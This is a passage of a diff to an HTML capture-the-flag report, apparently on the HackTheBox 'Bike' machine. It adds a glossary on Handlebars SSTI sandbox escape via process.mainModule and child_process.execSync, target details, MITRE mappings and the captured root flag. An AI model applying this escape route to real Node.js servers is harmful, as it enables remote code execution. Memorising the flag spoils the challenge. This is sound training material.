           final. Ejemplos: Handlebars, Jinja2 (Python), Twig (PHP), Pebble (Java).
           Cada uno tiene su sintaxis y sus vectores de SSTI especificos.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">Sandbox</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">Sandbox</div>
+        <div class="gloss-def">
           Entorno de ejecucion restringido que aísla el codigo de recursos del sistema.
           En Handlebars, el sandbox bloquea acceso a globals de Node.js como require().
           Sin embargo, no bloquea process ni la cadena de prototipos de objetos.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">process.mainModule</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">process.mainModule</div>
+        <div class="gloss-def">
           Referencia al modulo principal de Node.js (el archivo de entrada del proceso).
           Tiene su propio metodo <code>require()</code> con acceso completo al sistema de modulos.
           Usado como vector de escape del sandbox de Handlebars.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">RCE</div>
-<div class="gloss-def">
-<strong>Remote Code Execution.</strong> Capacidad de un atacante para ejecutar comandos
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">RCE</div>
+        <div class="gloss-def">
+          <strong>Remote Code Execution.</strong> Capacidad de un atacante para ejecutar comandos
           arbitrarios en el servidor remoto. Es la clase de vulnerabilidad mas critica, ya que
           otorga control total del sistema (especialmente si el proceso corre como root).
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">Stack Trace</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">Stack Trace</div>
+        <div class="gloss-def">
           Registro del historial de llamadas a funciones en el momento de un error.
           En desarrollo ayuda a depurar. En produccion, exponer stack traces al usuario
           revela informacion sensible: rutas, librerias usadas y privilegios del proceso.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">child_process.execSync</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">child_process.execSync</div>
+        <div class="gloss-def">
           Modulo y funcion de Node.js que permite ejecutar comandos del sistema operativo
           de forma sincrona. Equivalente a <code>os.system()</code> en Python o
           <code>exec()</code> en PHP. El objetivo final de la explotacion SSTI en Node.js.
         </div>
-</div>
-<div class="gloss-card">
-<div class="gloss-term">CWE-94</div>
-<div class="gloss-def">
+      </div>
+
+      <div class="gloss-card">
+        <div class="gloss-term">CWE-94</div>
+        <div class="gloss-def">
           Common Weakness Enumeration #94: "Improper Control of Generation of Code (Code Injection)".
           La categoria oficial que engloba SSTI, eval injection y vulnerabilidades similares
           donde input del usuario es ejecutado como codigo.
         </div>
-</div>
-</div>
+      </div>
     </div>
+  </section>
 
+</main>
+
+<!-- ──────────────────── SIDEBAR ──────────────────── -->
+<aside class="sidebar">
+
+  <!-- Target Info -->
+  <div class="sidebar-card">
+    <h3>Target Info</h3>
+    <div class="info-row">
+      <span class="info-label">Maquina</span>
+      <span class="info-value green">Bike</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Plataforma</span>
+      <span class="info-value">HackTheBox SP</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Dificultad</span>
+      <span class="info-value green">Very Easy</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">OS</span>
+      <span class="info-value">Ubuntu Linux</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">IP</span>
+      <span class="info-value mono">10.129.7.167</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Puerto web</span>
+      <span class="info-value mono">80/tcp HTTP</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Runtime</span>
+      <span class="info-value">Node.js / Express</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Template engine</span>
+      <span class="info-value" style="color:var(--red)">Handlebars.js</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Privilegio final</span>
+      <span class="info-value red">root (uid=0)</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Fecha</span>
+      <span class="info-value">2026-03-17</span>
+    </div>
+    <div class="info-row">
+      <span class="info-label">Tiempo total</span>
+      <span class="info-value green">~5 min</span>
+    </div>
   </div>
 
-  <div class="sidebar">
-    <div class="sidebar-card">
-      <h3>Detalles del Reto</h3>
-      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">VERY EASY</span></div>
-      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Linux</span></div>
-      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.129.X.X</span></div>
-      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Starting Point</span></div>
-      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">SSTI Handlebars</span></div>
-      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">—</span></div>
+  <!-- Herramientas -->
+  <div class="sidebar-card">
+    <h3>Herramientas Usadas</h3>
+    <div class="tool-item">
+      <div class="tool-icon">&#128270;</div>
+      <div>
+        <div class="tool-name">nmap</div>
+        <div class="tool-desc">Escaneo de puertos y servicios</div>
+      </div>
     </div>
-    <div class="sidebar-card">
-      <h3>Skills Demostradas</h3>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">SSTI</span><span class="skill-pct">95%</span></div><div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Node.js</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Web Exploitation</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
+    <div class="tool-item">
+      <div class="tool-icon">&#127760;</div>
+      <div>
+        <div class="tool-name">curl</div>
+        <div class="tool-desc">Peticiones HTTP / probe SSTI</div>
+      </div>
     </div>
-    <div class="sidebar-card">
-      <h3>Herramientas</h3>
-      <div class="tools-list">
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">Burp Suite</span></div>
+    <div class="tool-item">
+      <div class="tool-icon">&#9881;</div>
+      <div>
+        <div class="tool-name">Handlebars Payload</div>
+        <div class="tool-desc">Bypass sandbox via constructor chain</div>
       </div>
     </div>
   </div>
-</div>
 
-<script>
-  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
-  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
-  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
-  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
-  setInterval(drawMatrix,35);
-</script>
+  <!-- TOC -->
+  <div class="sidebar-card">
+    <h3>Indice de Contenidos</h3>
+    <a class="toc-item" href="#descripcion">01 &mdash; Descripcion</a>
+    <a class="toc-item" href="#reconocimiento">02 &mdash; Reconocimiento</a>
+    <a class="toc-item" href="#vulnerabilidades">03 &mdash; Vulnerabilidades</a>
+    <a class="toc-item" href="#ssti-explicacion">04 &mdash; Como funciona SSTI</a>
+    <a class="toc-item" href="#bhm-insight">05 &mdash; BHM Insight (nombre=pista)</a>
+    <a class="toc-item" href="#timeline">06 &mdash; Timeline</a>
+    <a class="toc-item" href="#explotacion">07 &mdash; Explotacion</a>
+    <a class="toc-item" href="#flag">08 &mdash; Flag</a>
+    <a class="toc-item" href="#recomendaciones">09 &mdash; Recomendaciones</a>
+    <a class="toc-item" href="#lecciones">10 &mdash; Lecciones</a>
+    <a class="toc-item" href="#glosario">11 &mdash; Glosario</a>
+  </div>
+
+  <!-- MITRE ATT&CK -->
+  <div class="sidebar-card">
+    <h3>MITRE ATT&amp;CK</h3>
+    <div class="mitre-item">
+      <span class="mitre-id">T1190</span>
+      <span class="mitre-name">Exploit Public-Facing Application (SSTI en formulario web)</span>
+    </div>
+    <div class="mitre-item">
+      <span class="mitre-id">T1059.007</span>
+      <span class="mitre-name">Command and Scripting Interpreter: JavaScript</span>
+    </div>
+    <div class="mitre-item">
+      <span class="mitre-id">T1548</span>
+      <span class="mitre-name">Abuse Elevation Control Mechanism (app running as root)</span>
+    </div>
+  </div>
+
+  <!-- Flag rapida -->
+  <div class="sidebar-card" style="padding:0;border:none;background:transparent;">
+    <div class="flag-box-sidebar">
+      <div class="flag-label">Root Flag</div>
+      <div class="flag-val">6b258d726d287462d60c103d0142a81c</div>
+    </div>
+  </div>
+
+</aside>
+
+</div><!-- /layout -->
+
+<!-- ══════════════════════════════════ FOOTER ════════════════════════════════ -->
+<footer>
+  <div class="footer-left">
+    <span class="footer-brand">Kali HTB Pentest Reports</span>
+    <span class="footer-sep">|</span>
+    <span>Bike &mdash; Starting Point</span>
+    <span class="footer-sep">|</span>
+    <span>2026-03-17</span>
+  </div>
+  <div style="display:flex;align-items:center;gap:16px;">
+    <span style="color:var(--text-muted);font-size:12px;">
+      Generado con Claude Code &bull; Estilo: HTB Dark Portfolio
+    </span>
+    <span class="badge badge-green" style="font-size:11px;">PWNED</span>
+  </div>
+</footer>
+
 </body>
 </html>
